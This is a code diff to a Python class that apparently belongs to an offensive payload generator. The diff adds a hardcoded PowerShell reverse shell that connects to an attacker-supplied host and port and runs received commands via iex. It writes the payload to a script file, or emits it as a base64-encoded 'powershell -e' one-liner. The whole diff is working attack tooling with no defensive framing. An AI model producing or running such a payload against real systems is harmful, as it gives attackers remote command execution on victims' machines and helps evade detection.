@@ -4,6 +4,20 @@ class ps_pl:
     def __init__(self, args, pl_path):
         self.args = args
         self.pl_path = pl_path
+        self.ps_revshell = f'''
+$client=New-Object System.Net.Sockets.TCPClient("{self.args.lhost}",{self.args.lport});
+$stream=$client.GetStream();
+[byte[]]$bytes=0..65535|%{{0}};
+while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne {self.args.lport}){{
+    $data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback=(iex $data 2>&1 | Out-String);
+    $sendback2=$sendback+"PS "+(pwd).Path+"> ";
+    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+}};
+$client.Close()
+'''
 
     def menu(self):
         print("\n--- Powershell Payload ---")
@@ -16,18 +30,12 @@ class ps_pl:
             self.b64()
 
     def plain(self):
-        with open(f'{self.pl_path}revshell.ps1', "r") as file:
-            powershell_script = file.read()
-        powershell_script = re.sub(r'"(\d+\.\d+\.\d+\.\d+)"', f'"{self.args.lhost}"', powershell_script)
-        powershell_script = re.sub(r'(\d+)(?=\))', f'{self.args.lport}', powershell_script)
         with open(f'{self.pl_path}revshell.ps1', "w") as file:
-            file.write(powershell_script)
+            file.write(self.ps_revshell)
         os.system(f'cp {self.pl_path}revshell.ps1 .')
 
     def b64(self):
-        with open(f'{self.pl_path}revshell.ps1', "r", encoding="utf-8") as f:
-            script = f.read()
-        utf16_bytes = script.encode('utf-16le')
+        utf16_bytes = self.ps_revshell.encode('utf-16le')
         base64_encoded = base64.b64encode(utf16_bytes).decode('ascii')
         with open(f'{self.pl_path}b64_revshell.ps1', "w") as file:
             file.write(f'powershell -e {base64_encoded}')
